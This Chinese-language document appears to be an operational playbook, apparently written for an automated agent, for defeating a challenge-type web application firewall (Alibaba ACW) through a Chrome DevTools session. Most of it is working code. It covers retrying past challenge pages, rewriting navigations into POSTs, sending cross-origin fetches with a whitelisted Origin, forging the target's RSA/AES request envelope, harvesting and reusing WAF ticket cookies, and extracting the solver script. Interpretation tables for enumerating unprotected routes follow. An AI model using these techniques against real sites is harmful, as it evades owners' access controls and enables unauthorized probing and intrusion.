# 挑战型 WAF 通道配方（可复制）

变量约定：`t` = CDP 会话对象（提供 `send`/`call`/`ev`/`pump`），`BASE` = 目标 origin。

## 1. 导航读通道（GET 数据，最稳）
```python
# ★ 导航不是恒过：同路径重试到出真响应（挑战页不是判死依据）
def nav_probe(path, tries=3, pump=9):
    for i in range(tries):
        t.send("Page.navigate", url=BASE + path)
        t.pump(pump)
        href = str(t.ev("location.href"))     # 带 refer__/encode__/md5__ 回跳参数 = 这次是真的
        txt  = str(t.ev("String(document.body?document.body.innerText:'').slice(0,1500)"))
        if "renderData" not in txt and "_waf_" not in txt and len(txt) != 110310:
            return "try%d REAL %s :: %s" % (i + 1, href, txt)
        time.sleep(2)
    return "ALL_CHALLENGE"                   # 只有跑满 tries 才可判死

print(nav_probe(path))
```
- JSON 端点也以文本渲染 ⇒ 直接读；401/403 的 JSON 错误体同样可读。
- 判挑战：body 含 `renderData`/`_waf_`，或长度 ≈110310。
- 这一步同时给出「应用侧闸门分层」：401 = 已进认证过滤器，403 = 被贴前置过滤器挡，404 = 无路由。★ **读这张表前先用一条乱写路径定 catch-all 档**：catch-all=403 时「401 = permitAll 成员」（白名单 oracle，可直接扫免票路由）；catch-all=401 时 401 什么也没证明，须靠 404 判白名单。

## 2. 导航车辆 + Fetch 域改写（POST 投递）
```python
t.target  = "/login"                                   # 路径，精确，别用通配

t.EMETHOD = "POST"
t.EBODY   = json.dumps({...})
t.EHEAD   = {"Content-Type": "application/json;charset=utf-8"}
t.rewrites = []
t.send("Fetch.enable", patterns=[{"urlPattern": "*<host>" + t.target + "*",
                                  "requestStage": "Request"}])
t.send("Page.navigate", url=BASE + t.target)            # 车辆 = 顶层导航
t.pump(14)
t.send("Fetch.disable")
print(list(t.rewrites), str(t.ev("location.href")))    # 回执自证（见 SKILL §2）
```
- 原理：WAF 端看到的仍是 doc 导航（放行），应用端看到 POST + 真 body。
- 先跑一次 GET 对照组，确认改写管道生效，再判「WAF 降级」还是「改写没生效」。
- 被降级时会看到 final URL 变 `?alichlgref=<原URL>` 且 body 丢弃 —— 该实例此路不通，换面。

## 2.5 ★★★★ 跨源 XHR + 白名单 `Origin`/`Referer`（真 POST 通道，首选）
```python
# 页面必须停在「WAF 白名单域」= 平台自己的前端域（其 Origin/Referer 原值取自 SPA baseURL 或真抓包）
API = "https://<受 ACW 保护的接口域>"
r = t.js("""(async()=>{const r=await fetch('%s%s',{method:'POST',
      headers:{'Content-Type':'application/json;charset=UTF-8','Origin':''+location.origin},
      body:JSON.stringify(%s),mode:'cors',credentials:'omit'});
      return r.status+'|'+(r.headers.get('content-type')||'')+'|'+(await r.text()).slice(0,400);})()""" % (API, path, body),
      await_promise=True)
```
- **原理**：生产前端本来就从这个前端域跨源调接口域 ⇒ WAF 白名单放行该 `Origin`/`Referer`；与 cookie、票据、指纹头、求解器全无关。
- **必须 `credentials:'omit'`**：`include` 会被接口侧 CORS 拒（症状 `TypeError: Failed to fetch`），而这条通道**不需要** cookie。
- **判据**：回包是业务响应（加密信封则先解密），**无** `renderData`/≈110310 挑战特征。若服务端用**我方**给的密钥加密应答（响应头不再回 `encrypt-key`），即证明它读了我方信封密钥 ⇒ 通道 + 信封同时成立，别再回头改 crypto。
- **载体页怎么来**：`Page.navigate` 到前端域即可（它挂在另一张通常无 ACW 的 CDN 上）；**页面不必先解过挑战**。
- 这条同时解锁 POST / 自定义头 / 任意 Content-Type / 任意体，是「应用侧加密信封 + ACW」组合目标的现实入口。

## 2.6 表单/导航型 POST 的体不可控（判据：`alichlgref=`）
- 导航 + `Fetch.continueRequest` 改写方法/体之后，WAF 会**重放**该请求：final URL 追加 `?alichlgref=<原URL>`，且**请求体被复位成原始表单值**（实测改写出的密文体回到 `a=1`），同时注入的 Content-Type/头一并丢失。
- **判据 = final URL 出现 `alichlgref=` 且后端看到的是原始体**（不是改写后的体）。⇒ 见到此形态立刻换通道（§2.5），不要再调改写参数。

## 2.7 信封加密 API：Python 加密 + 页面投递 + Python 解密（挑战 WAF 下的唯一现实分工）
```python
# 1) Python 侧造信封（实现来自目标 bundle 的前端拦截器原文）
key  = uuid.uuid4().hex                                  # 32 字节 ASCII
b64key = base64.b64encode(key.encode()).decode()
ek   = base64.b64encode(rsa_pkcs1v15(PUB, b64key)).decode()   # 请求头 encrypt-key
body = base64.b64encode(aes_256_ecb_pkcs7(json.dumps(payload), key)).decode()
# 2) 页面侧只负责「发」：密文/头用 json.dumps 注入，页内不做任何 crypto
r = t.js("(async()=>{const r=await fetch('%s%s',{method:'POST',"
        "headers:{'Content-Type':'application/json;charset=UTF-8','encrypt-key':%s},"
        "body:JSON.stringify(%s),mode:'cors',credentials:'omit'});"
        "return r.status+'|'+(r.headers.get('encrypt-key')||'')+'|'+await r.text();})()"
        % (API, path, json.dumps(ek), json.dumps(body)), await_promise=True)
# 3) Python 侧解密：用「响应头 encrypt-key」解出的 key（前 32 字节）解 body
```
- **判据（唯一硬证据）**：响应能用**我方解出的 key** 解开 ⇒ 服务端读了我方信封（响应头不再回 `encrypt-key` 即服务端以我方 key 加密应答）⇒ **通道 + 信封同时成立**，下一步是换票/换端点，**不是**回头改 crypto、换密钥、猜公钥。
- **成对铁律**：`encrypt-key` 与 body 必须来自**同一次**封装；拿 A 的 ek 配 B 的 body ⇒ 500 / `Invalid padding bytes` = **配对错**，不是明文错。
- **为什么不在页内做 crypto**：页面 WebCrypto 常缺原语（实测不认 `RSAES-PKCS1-v1_5`、无 ECB）⇒ 页内加密死路；分界固定为「**密码学在 Python，传输在页面**」。
- **不要把 `X-Forwarded-For` 加进这条通道**（见 SKILL §7）：会把整片页内放行面翻成挑战。
- **密文类响应禁止小切片**：给 JS 的 `slice(0,cap)` 会截断密文 ⇒ 假 `Invalid padding bytes` ⇒ 密文类响应 cap 必须 ≥30000，或全量取体。

## 3. cookie 罐（机外复用票据用）
```python
r  = t.call("Network.getCookies", urls=[BASE + "/"])     # ★必须用同步调用拿结果
CK = "; ".join("%s=%s" % (c["name"], c["value"])
                for c in (r.get("result") or {}).get("cookies") or [])
```
- fire-and-forget 的 `send` 只回消息 id ⇒ cookie 会静默为空，后续机外请求必被挑战，别误判成「票据没用」。
- 典型罐：`acw_tc` / `aliyungf_tc` / `ssxmod_itna` / `ssxmod_itna2`。

## 4. 票据语义
- 形态：`?<name>__<rand>=<固定前缀>-<密文>`；名称会轮换（`md5__1713` / `refer__1720` / `encode__1715`），前缀同源（如 `2790552d`）。
- **每次导航铸一枚；URI 绑定 + 短时效**：换路径 ⇒ 回到挑战页。
- 机外复用 = 同一 URI + **cookie 罐** + 新鲜票据三件齐备；缺 cookie 必被挑战。
- **票据不授权子资源请求**：页内 XHR 挂上同一枚票据照样被挑战。
- 导航本身会消耗/刷新它 ⇒ 需要新票据时，重新导航一次再抓 final URL。

## 5. 求解器提取
```python
js = str(t.ev("(localStorage.getItem('_waf_<id>')||'')"))
enc, _, ts = js.rpartition("||")
src = urllib.parse.unquote(enc)      # URL 编码的混淆 IIFE，可直接 eval
```
- 挑战页 = 内联 IIFE + 外链 `/<a>/<b>/<c>`（约 174KB 混淆）两件套；localStorage 那份是**已就绪、可直接执行**的版本。
- 同族键：`_waf_bd8ce2ce37`（主票据）、`_waf_a23a0b772`（求解器本体，约 103K 字符）、`_waf_a86dfdc5f2`（短 token）。

## 6. 假 oracle 清单（先排除再下结论）
| 形态 | 判读 |
|---|---|
| 对照与实验**同字响应** | 通道零信息量 → 换通道 |
| 后缀矩阵对「真实路径」与「编造路径」返回**同一框架错误** | 只穿闸门未到控制器 → 停手 |
| 页内 XHR 即使挂票据仍挑战 | 正常行为，不是票据失效 → 别再去雕票据 |
| 应用返回自己的 403/500 | 已穿过 WAF → 转去解应用侧闸门（枚举真端点，别继续雕 WAF） |
| `200 + 0 字节`（无 `Content-Type`） | 静态资源处理器 / 兜底：**不存在的路径也回 200+0**（`/system/**` 尤其）⇒ 不是「读到文件」→ 判可读须与已知存在的文件对照 |
| 同路径换后缀后档位变了（`/getInfo`→401 而 `/getInfo.json`→403） | 后缀让请求匹配不上 permitAll 规则 ⇒ **后缀只用来穿 WAF 看框架层，不能用来判白名单** |
| 单次导航回挑战页 | 可能只是没解到 ⇒ 同路径重试 ≥3 次再判死（见 §1） |

## 7. 客户端白名单 ≠ 服务端放行面
bundle 里的 `pl="/,/login,/register,/captchaImage,/profile/**,/common/upload,…"` 这类数组是**接口清单字典**（以其中任一具体端点名为锚，如 `captchaImage`，可在 bundle 里反查出真实接口定义与 baseURL），但**不能当服务端放行面用**：实测该白名单含 `/login`，服务端仍 403。

## 8. 端点/端点参数型 oracle 的小信号
- 路径变量类型错会变成显式文案（如 `参数错误`）而**不是** 404 ⇒ 说明路由存在、只是 key 类型不对（须数字/须 UUID）→ 可据此定 key 类型再决定枚举面。
